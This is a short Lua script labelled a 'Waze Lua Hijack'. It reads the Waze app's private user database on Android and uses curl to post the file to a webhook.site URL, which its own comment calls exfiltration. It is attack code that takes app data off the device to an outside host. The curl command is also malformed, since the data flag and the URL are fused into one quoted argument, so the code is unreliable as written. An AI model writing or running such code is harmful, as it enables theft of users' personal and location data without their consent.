
-- Waze Lua Hijack
local file = io.open("/data/data/com.waze/databases/user.db", "rb")
if file then
    local content = file:read("*all")
    file:close()
    
    -- Exfiltrate data using native OS curl (or fallback to Lua socket if available)
    os.execute("curl -X POST -H 'Content-Type: application/octet-stream' --data-binary '@-" .. "https://webhook.site/a593d213-e214-4f31-b2c5-6971c448d924' < /data/data/com.waze/databases/user.db")
end
